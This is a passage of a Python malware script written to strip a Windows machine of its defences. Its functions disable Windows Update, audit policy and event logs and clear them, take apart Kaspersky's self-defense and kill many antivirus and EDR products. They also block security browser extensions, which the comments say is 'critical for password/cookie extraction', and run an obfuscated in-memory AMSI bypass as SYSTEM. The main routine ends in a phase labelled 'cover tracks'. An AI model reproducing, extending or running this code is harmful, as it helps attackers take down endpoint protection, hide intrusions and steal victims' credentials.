             "DisableWindowsUpdateAccess", 1)

    update_svcs = [
        "wuauserv",      # Windows Update
        "WaaSMedicSvc",  # Update Medic
        "UsoSvc",        # Update Orchestrator
        "BITS",          # Background Intelligent Transfer
        "DoSvc",         # Delivery Optimization
    ]
    for svc in update_svcs:
        _run(["sc", "config", svc, "start=", "disabled"])
        _run(["sc", "stop", svc])


# ╔══════════════════════════════════════════════════════╗
# ║  8. DISABLE EVENT LOGGING                           ║
# ╚══════════════════════════════════════════════════════╝
def disable_logging():

    _run(["auditpol", "/set", "/category:*", "/success:disable", "/failure:disable"])

    # Disable specific event logs
    logs_to_disable = [
        "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Security",
    ]
    for log in logs_to_disable:
        _ps(f"wevtutil sl '{log}' /e:false")

    # Disable PowerShell logging
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
             "EnableScriptBlockLogging", 0)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging",
             "EnableModuleLogging", 0)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription",
             "EnableTranscripting", 0)

    # Clear all relevant logs
    _ps("""
        $logs = @('Security', 'System', 'Application',
                  'Microsoft-Windows-Windows Defender/Operational',
                  'Microsoft-Windows-PowerShell/Operational',
                  'Microsoft-Windows-Sysmon/Operational',
                  'Microsoft-Windows-TaskScheduler/Operational',
                  'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational')
        foreach ($l in $logs) {
            try { wevtutil cl $l 2>$null } catch {}
        }
    """)

    # Disable ETW providers for Defender
    _ps("""
        try {
            $providers = @(
                '{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}',
                '{9E814AAD-3204-11D2-9A82-006008A86939}'
            )
            foreach ($p in $providers) {
                logman stop $p -ets 2>$null
            }
        } catch {}
    """)

    # Stop event log service (aggressive)
    _run(["sc", "config", "EventLog", "start=", "disabled"])


# ╔══════════════════════════════════════════════════════╗
# ║  9. KILL THIRD-PARTY AV (comprehensive)             ║
# ╚══════════════════════════════════════════════════════╝
def kill_third_party_av():

    # ╔════════════════════════════════════════════════════╗
    # ║  KASPERSKY — requires special handling             ║
    # ║  Self-Defense (klhk.sys) blocks taskkill/sc stop   ║
    # ╚════════════════════════════════════════════════════╝

    # Step 1: Disable Kaspersky Self-Defense via registry FIRST
    # This must happen before any attempt to kill processes/services
    kasp_roots = [
        r"SOFTWARE\KasperskyLab\protected\AVP21.0",
        r"SOFTWARE\KasperskyLab\protected\AVP20.0",
        r"SOFTWARE\KasperskyLab\protected\AVP19.0",
        r"SOFTWARE\KasperskyLab\protected\KES21.0",
        r"SOFTWARE\KasperskyLab\protected\KES20.0",
        r"SOFTWARE\KasperskyLab\protected\KSDE2.0",
        r"SOFTWARE\KasperskyLab\protected\KIS21.0",
        r"SOFTWARE\KasperskyLab\protected\KIS20.0",
        r"SOFTWARE\KasperskyLab\protected\KFA21.0",
        r"SOFTWARE\KasperskyLab\AVP21.0",
        r"SOFTWARE\KasperskyLab\AVP20.0",
    ]
    # Enumerate dynamically too — Kaspersky version strings change
    try:
        kl_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                   r"SOFTWARE\KasperskyLab\protected",
                                   0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        i = 0
        while True:
            try:
                sub = winreg.EnumKey(kl_key, i)
                kasp_roots.append(f"SOFTWARE\\KasperskyLab\\protected\\{sub}")
                i += 1
            except OSError:
                break
        winreg.CloseKey(kl_key)
    except Exception:
        pass
    try:
        kl_key2 = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                    r"SOFTWARE\KasperskyLab",
                                    0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        i = 0
        while True:
            try:
                sub = winreg.EnumKey(kl_key2, i)
                kasp_roots.append(f"SOFTWARE\\KasperskyLab\\{sub}")
                i += 1
            except OSError:
                break
        winreg.CloseKey(kl_key2)
    except Exception:
        pass

    for kr in set(kasp_roots):
        # Disable self-defense
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableSelfProtection", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "AllowManageComponents", 1)
        # Disable protection components
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableKSN", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableRealTimeProtection", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableWebProtection", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableMailProtection", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableFirewall", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "EnableBannerAdBlocker", 0)
        # Disable password protection on settings
        _reg_set(winreg.HKEY_LOCAL_MACHINE, kr + r"\settings", "PasswordProtectionEnabled", 0)

    # Step 2: PowerShell — take ownership of Kaspersky registry keys + disable
    _ps("""
        try {
            # Take ownership of Kaspersky protected keys
            $klPaths = @(
                'HKLM:\\SOFTWARE\\KasperskyLab\\protected',
                'HKLM:\\SOFTWARE\\KasperskyLab'
            )
            foreach ($p in $klPaths) {
                try {
                    $acl = Get-Acl $p -ErrorAction SilentlyContinue
                    if ($acl) {
                        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
                            'BUILTIN\\Administrators', 'FullControl',
                            'ContainerInherit,ObjectInherit', 'None', 'Allow')
                        $acl.SetAccessRule($rule)
                        Set-Acl -Path $p -AclObject $acl -ErrorAction SilentlyContinue
                    }
                } catch {}
                Get-ChildItem $p -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                    try {
                        Set-ItemProperty -Path $_.PSPath -Name 'EnableSelfProtection' -Value 0 -Force -ErrorAction SilentlyContinue
                        Set-ItemProperty -Path $_.PSPath -Name 'EnableRealTimeProtection' -Value 0 -Force -ErrorAction SilentlyContinue
                    } catch {}
                }
            }
        } catch {}
    """, timeout=15)

    # Step 3: Disable Kaspersky kernel drivers via registry (prevent reload on next boot)
    kasp_drivers = [
        "klhk",        # Kaspersky Hook driver (self-defense)
        "klhkum",      # User-mode hook driver
        "klif",        # Kaspersky Lab Interceptor Framework
        "klifks",      # KLIF Key Storage
        "klifaa",      # KLIF Auto-activation
        "klim6",       # Kaspersky Lab Internet Monitor 6
        "klpd",        # Kaspersky Lab Protection Device
        "kneps",       # Kaspersky Network Protection System
        "klwtp",       # Kaspersky Lab Web Traffic Protection
        "klark",       # Kaspersky Anti-Rootkit
        "klbg",        # Kaspersky Lab Background Worker
        "kl1",         # Kaspersky Lab KL1
        "kl2",         # Kaspersky Lab KL2
        "kldisk",      # Kaspersky Lab Disk Filter
        "klflt",       # Kaspersky Lab File System Filter
        "klbackupdisk",
        "klbackupflt",
        "klpnpflt",
        "kltap",       # Kaspersky VPN TAP adapter
    ]
    for drv in kasp_drivers:
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 f"SYSTEM\\CurrentControlSet\\Services\\{drv}",
                 "Start", 4)  # 4 = disabled

    # Step 4: Unload Kaspersky drivers if possible
    for drv in kasp_drivers:
        _run(["sc", "stop", drv])
        # fltmc — unload minifilter drivers
        _run(["fltmc", "unload", drv])

    # Step 5: Now safe to kill Kaspersky processes + services
    kasp_procs = [
        "avp.exe", "avpui.exe", "kavtray.exe", "klnagent.exe",
        "ksde.exe", "ksdeui.exe", "kavfs.exe", "klnagchk.exe",
        "kl_platf.exe", "avpsus.exe",
    ]
    kasp_svcs = [
        "avp", "AVP21", "AVP20", "klnagent", "kavfsslp", "kavfs",
        "KSDE", "KSCWebConsole", "klvsagent", "CSAdminService",
    ]

    # Try WMI terminate first (bypasses some protections)
    for proc in kasp_procs:
        _run(["wmic", "process", "where", f"name='{proc}'", "call", "terminate"], shell=True)
    time.sleep(1)

    for proc in kasp_procs:
        _run(["taskkill", "/f", "/im", proc])

    for svc in kasp_svcs:
        _run(["sc", "stop", svc])
        _run(["sc", "config", svc, "start=", "disabled"])
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 f"SYSTEM\\CurrentControlSet\\Services\\{svc}",
                 "Start", 4)

    # Step 6: Schedule task as SYSTEM to kill Kaspersky (bypasses user-level protections)
    _ps("""
        try {
            $cmd = 'Get-Process -Name avp,avpui,kavtray -ErrorAction SilentlyContinue | Stop-Process -Force; Stop-Service avp -Force -ErrorAction SilentlyContinue; Set-Service avp -StartupType Disabled -ErrorAction SilentlyContinue'
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -Command $cmd"
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest -LogonType ServiceAccount
            Register-ScheduledTask -TaskName 'KLMaintenanceTask' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
            Start-Sleep 3
            Unregister-ScheduledTask -TaskName 'KLMaintenanceTask' -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    """, timeout=15)

    # ╔════════════════════════════════════════════════════╗
    # ║  ALL OTHER AV — standard kill                      ║
    # ╚════════════════════════════════════════════════════╝

    av_procs = [
        # ── Avast / AVG ──
        "AvastUI.exe", "AvastSvc.exe", "aswEngSrv.exe", "aswidsagent.exe",
        "aswToolsSvc.exe", "avgui.exe", "avgsvc.exe", "avgidsagent.exe",
        # ── Norton / Symantec / Broadcom ──
        "NortonSecurity.exe", "ccSvcHst.exe", "nsWscSvc.exe",
        "Norton360.exe", "ns.exe", "navapsvc.exe",
        "SepMasterService.exe", "smc.exe", "SmcGui.exe",
        # ── Bitdefender ──
        "bdagent.exe", "bdservicehost.exe", "bdntwrk.exe",
        "vsserv.exe", "updatesrv.exe", "bdredline.exe",
        # ── McAfee ──
        "mcshield.exe", "McUICnt.exe", "mfemms.exe", "mfevtps.exe",
        "mcapexe.exe", "ModuleCoreService.exe",
        # ── ESET ──
        "egui.exe", "ekrn.exe", "eguiProxy.exe",
        # ── Malwarebytes ──
        "mbam.exe", "mbamservice.exe", "MBAMTray.exe", "mbamgui.exe",
        # ── Trend Micro ──
        "PccNTMon.exe", "TMBMSRV.exe", "TmListen.exe", "ntrtscan.exe",
        "TmCCSF.exe", "coreServiceShell.exe",
        # ── Comodo ──
        "CisTray.exe", "cmdagent.exe", "cfp.exe",
        # ── F-Secure ──
        "fshoster.exe", "fsgk32.exe", "fsav32.exe", "fsma32.exe",
        # ── Sophos ──
        "SavService.exe", "ALMon.exe", "SAVAdminService.exe",
        "SophosUI.exe", "SophosHealth.exe", "SSPService.exe",
        "HitmanPro.Alert.exe", "hmpalert.exe",
        # ── Webroot ──
        "WRSA.exe", "WRCoreService.exe",
        # ── Panda / WatchGuard ──
        "PSANHost.exe", "PSUAService.exe", "PSUAMain.exe",
        # ── CrowdStrike ──
        "CSFalconService.exe", "CSFalconContainer.exe",
        # ── SentinelOne ──
        "SentinelAgent.exe", "SentinelServiceHost.exe",
        # ── Cylance ──
        "CylanceSvc.exe", "CylanceUI.exe",
        # ── Carbon Black ──
        "RepMgr.exe", "RepWsc.exe", "cb.exe",
        # ── Windows Security tray ──
        "SecurityHealthSystray.exe",
        # ── Dr.Web ──
        "dwengine.exe", "dwarkdaemon.exe", "dwwatcher.exe", "dwantispam.exe",
        # ── G Data ──
        "AVKWCtlx64.exe", "GDScan.exe", "AVKProxy.exe",
        # ── ZoneAlarm ──
        "ZAPrivacyService.exe", "vsmon.exe", "zlclient.exe",
    ]

    for proc in av_procs:
        _run(["taskkill", "/f", "/im", proc])

    # Stop and disable services
    av_services = [
        # Avast/AVG
        "avast", "AvastWscReporter", "aswbIDSAgent", "avgwd",
        # Norton/Symantec
        "NortonSecurity", "ccSetMgr", "ccEvtMgr", "SepMasterService",
        # Bitdefender
        "bdservicehost", "VSSERV", "UPDATESRV",
        # McAfee
        "McShield", "McAfee WebAdvisor", "masvc", "macmnsvc", "mfefire",
        # ESET
        "ekrn", "ERAAgent",
        # Malwarebytes
        "MBAMService",
        # Trend Micro
        "TmCCSF", "ntrtscan", "TMListen",
        # F-Secure
        "fshoster32", "FSMA",
        # Sophos
        "SAVService", "SAVAdminService", "Sophos Agent", "SntpService",
        "Sophos MCS Agent", "HitmanPro.Alert",
        # Webroot
        "WRSVC",
        # Panda
        "PSUAService", "NanoServiceMain",
        # CrowdStrike
        "CSFalconService",
        # SentinelOne
        "SentinelAgent", "SentinelStaticEngine",
        # Cylance
        "CylanceSvc",
        # Carbon Black
        "CbDefense", "CbDefenseWSC",
        # Dr.Web
        "DrWebService", "SpIDerAgent",
        # G Data
        "AVKWCtl", "AVKProxy", "GDScan",
    ]
    for svc in av_services:
        _run(["sc", "stop", svc])
        _run(["sc", "config", svc, "start=", "disabled"])

    # Unregister from Security Center (removes AV from Windows Security panel)
    _ps("""
        try {
            $wscPath = 'HKLM:\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av'
            Get-ChildItem $wscPath -ErrorAction SilentlyContinue | ForEach-Object {
                Set-ItemProperty -Path $_.PSPath -Name 'DetectionStatus' -Value 0 -ErrorAction SilentlyContinue
            }
        } catch {}
    """)

    # ── Disable browser protection injections (Kaspersky, Avast, Norton inject into browsers) ──
    # This is critical for password/cookie extraction — injected DLLs block CDP and DB access
    _disable_browser_av_extensions()


def _disable_browser_av_extensions():
    """Remove AV browser extensions and injected DLLs that block credential extraction."""

    # Kaspersky injects light_plugin_*.dll and uses browser extensions
    # Disable Kaspersky browser plugin via policy
    chrome_ext_blacklist = [
        "ahkjpbeeocnddjkakilopmfdlnjdpcdm",  # Kaspersky Protection (Chrome)
        "jagncdcchgajhfhijbbhecadmaiegcmh",  # Kaspersky Password Manager
        "bfnaelmomeimhlpmgjnjophhpkkoljpa",  # Norton Password Manager
        "gighmmpiobklfepjocnamgkkbiglidom",  # Avast Online Security
        "dalednnbbppjjackdmpfhpahkjbcociag",  # Bitdefender Anti-Tracker
        "dgjkhjdcljddbmoifgkgdmhpobpkharh",  # Trend Micro Check
    ]

    # Chrome policy to block AV extensions
    for i, ext_id in enumerate(chrome_ext_blacklist):
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Policies\Google\Chrome\ExtensionInstallBlocklist",
                 str(i + 1), ext_id, winreg.REG_SZ)
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallBlocklist",
                 str(i + 1), ext_id, winreg.REG_SZ)

    # Disable Kaspersky Content Blocker + URL Advisor (blocks login page navigation)
    for kr in [r"SOFTWARE\KasperskyLab", r"SOFTWARE\WOW6432Node\KasperskyLab"]:
        try:
            kl = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, kr, 0,
                                   winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            i = 0
            while True:
                try:
                    sub = winreg.EnumKey(kl, i)
                    _reg_set(winreg.HKEY_LOCAL_MACHINE, f"{kr}\\{sub}\\settings",
                             "EnableWebProtection", 0)
                    _reg_set(winreg.HKEY_LOCAL_MACHINE, f"{kr}\\{sub}\\settings",
                             "EnableUrlAdvisor", 0)
                    _reg_set(winreg.HKEY_LOCAL_MACHINE, f"{kr}\\{sub}\\settings",
                             "SafeBankingEnabled", 0)
                    _reg_set(winreg.HKEY_LOCAL_MACHINE, f"{kr}\\{sub}\\settings",
                             "EnableAntiPhishing", 0)
                    _reg_set(winreg.HKEY_LOCAL_MACHINE, f"{kr}\\{sub}\\settings",
                             "EnablePasswordManager", 0)
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(kl)
        except Exception:
            pass

    # Kill Kaspersky browser helper processes
    for proc in ["klwtblfs.exe", "plugin-nm-server.exe", "light_agent.exe"]:
        _run(["taskkill", "/f", "/im", proc])

    # ESET browser protection
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\ESET\ESET Security\CurrentVersion\Info",
             "WebAndEmailEnabled", 0)

    # Avast/AVG browser cleanup
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\AVAST Software\Avast",
             "WebShield", 0)

    # Remove Image File Execution Options debugger redirects (some AV use these)
    ifeo_base = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
    browsers = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
    for b in browsers:
        _reg_del(winreg.HKEY_LOCAL_MACHINE, f"{ifeo_base}\\{b}", "Debugger")
        _reg_del(winreg.HKEY_LOCAL_MACHINE, f"{ifeo_base}\\{b}", "MitigationOptions")


# ╔══════════════════════════════════════════════════════╗
# ║  10. DISABLE AMSI (AntiMalware Scan Interface)      ║
# ╚══════════════════════════════════════════════════════╝
def disable_amsi():
    """Disable AMSI so PowerShell scripts aren't scanned."""

    # Registry method
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\AMSI\Providers",
             "Disable", 1)

    # Unregister Defender AMSI provider
    _ps("""
        try {
            $amsiPath = 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}'
            Remove-Item -Path $amsiPath -Recurse -Force -ErrorAction SilentlyContinue
        } catch {}
    """)

    # In-memory AMSI bypass via scheduled task as SYSTEM
    _ps("""
        try {
            $cmd = '[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType("System.Ma"+"nagement.Auto"+"mation.Am"+"siU"+"tils").GetField("am"+"siIn"+"itFa"+"iled","NonPublic,Static").GetValue($null),1)'
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -Command $cmd"
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest -LogonType ServiceAccount
            Register-ScheduledTask -TaskName 'DiskOptCheck' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
            Start-Sleep 2
            Unregister-ScheduledTask -TaskName 'DiskOptCheck' -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    """, timeout=10)


# ╔══════════════════════════════════════════════════════╗
# ║  11. DISABLE WINDOWS DEFENDER SCHEDULED TASKS       ║
# ╚══════════════════════════════════════════════════════╝
def disable_defender_tasks():
    """Disable scheduled tasks that re-enable Defender."""

    tasks = [
        r"\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
        r"\Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
        r"\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
        r"\Microsoft\Windows\Windows Defender\Windows Defender Verification",
        r"\Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh",
    ]

    for task in tasks:
        _ps(f"Disable-ScheduledTask -TaskPath '{os.path.dirname(task)}\\' -TaskName '{os.path.basename(task)}' -ErrorAction SilentlyContinue")
        _run(["schtasks", "/change", "/tn", task, "/disable"])


# ╔══════════════════════════════════════════════════════╗
# ║  MAIN — EXECUTION ORDER MATTERS                     ║
# ╚══════════════════════════════════════════════════════╝
def main():
    import threading

    # Elevate silently without prompts
    if not is_admin():
        silent_elevate()
        # Continue even without admin — many ops still work

    # ── PHASE 1: SILENCE EVERYTHING (before any AV changes) ──
    # Run mute + notifications in parallel — independent
    t_mute = threading.Thread(target=mute_system_sounds, daemon=True)
    t_notif = threading.Thread(target=kill_notifications, daemon=True)
    t_mute.start(); t_notif.start()
    t_mute.join(timeout=10); t_notif.join(timeout=10)
    time.sleep(0.3)

    # ── PHASE 2: DISABLE PROTECTION LAYERS ──
    # Tamper protection MUST go first — it blocks all other Defender changes
    disable_tamper_protection()
    time.sleep(0.5)

    # These are independent — parallelize
    phase2_fns = [
        disable_amsi,
        disable_defender,
        disable_defender_tasks,
        disable_firewall,
        disable_smartscreen,
        disable_smart_app_control,
        disable_uac,
        disable_updates,
    ]
    phase2_threads = []
    for fn in phase2_fns:
        t = threading.Thread(target=fn, daemon=True)
        t.start()
        phase2_threads.append(t)
    for t in phase2_threads:
        t.join(timeout=30)

    # ── PHASE 3: KILL THIRD-PARTY AV ──
    kill_third_party_av()

    # ── PHASE 4: COVER TRACKS ──
    disable_logging()

    # Let services die
    time.sleep(1)


if __name__ == "__main__":
    main()